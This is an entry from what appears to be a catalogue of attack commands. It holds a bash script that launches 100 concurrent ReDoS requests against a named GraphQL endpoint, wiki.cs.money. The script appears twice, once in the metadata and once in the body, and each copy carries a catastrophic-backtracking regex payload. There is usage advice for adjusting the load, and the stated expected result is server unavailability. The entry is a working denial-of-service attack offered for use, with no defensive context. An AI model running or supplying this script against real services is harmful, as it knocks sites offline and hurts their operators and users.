---
data: >-
  #!/bin/bash

  RED='\033[0;31m'

  Y='\033[0;33m'

  NC='\033[0m' # No Color

  printf
  "${Y}================================================================\n"

  printf "====================${NC} EXECUTING THE PAYLOAD ON
  ${Y}=======================\n"

  printf "${NC}https://wiki.cs.money/graphql ${Y}========\n"

  printf
  "${Y}================================================================${NC}\n"

  for i in {1..100}; do curl 'https://wiki.cs.money/graphql' -H 'user-agent:
  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
  Gecko) Chrome/85.0.4183.121 Safari/537.36' -H 'content-type: application/json'
  -H 'accept: */*' --data-binary $'{"query":"query a { \n search(q:
  \"[a-zA-Z0-9]+\\\\\\s?)+$\|^(\[a-zA-Z0-9.\'\\\\\\w\\\\\\W\]+\\\\\\s?)+$\\\\\\\",
  lang: \"en\") {\n  _id\n  weapon_id\n  rarity\n  collection{  _id name }\n 
  collection_id \n  \n }\n}","variables":null}' --compressed & done
tags:
  - dos
  - concurrent
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.201Z'
id: 6cf8e364-2742-4d06-9726-ced0690a8ba1
verified: false
validated: true
submitted: true
---
# amplify-concurrent-dos

## Command

```bash
#!/bin/bash
RED='\033[0;31m'
Y='\033[0;33m'
NC='\033[0m' # No Color
printf "${Y}================================================================\n"
printf "====================${NC} EXECUTING THE PAYLOAD ON ${Y}=======================\n"
printf "${NC}https://wiki.cs.money/graphql ${Y}========\n"
printf "${Y}================================================================${NC}\n"
for i in {1..100}; do curl 'https://wiki.cs.money/graphql' -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' -H 'content-type: application/json' -H 'accept: */*' --data-binary $'{"query":"query a { \n search(q: \"[a-zA-Z0-9]+\\\\\\s?)+$\|^(\[a-zA-Z0-9.\'\\\\\\w\\\\\\W\]+\\\\\\s?)+$\\\\\\\", lang: \"en\") {\n  _id\n  weapon_id\n  rarity\n  collection{  _id name }\n  collection_id \n  \n }\n}","variables":null}' --compressed & done
```

## Description

Bash script to launch 100 concurrent ReDoS attacks for amplified DoS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `for i in {1..100}` | Loop count | Yes |
| `&` | Background execution | Yes |
| curl subcommand | ReDoS payload | Yes |

## Examples

### Basic Usage

Save as script and run `bash script.sh`.

### Advanced Usage

Adjust loop to {1..50} for lighter load.

```bash
for i in {1..50}; do ... & done
```

## Expected Output

Console banners, then server unavailability; no responses.

## Related

- [[commands/exploit-single-redos]]
- [[procedures/Amplify-DoS-with-Concurrent-Requests]]
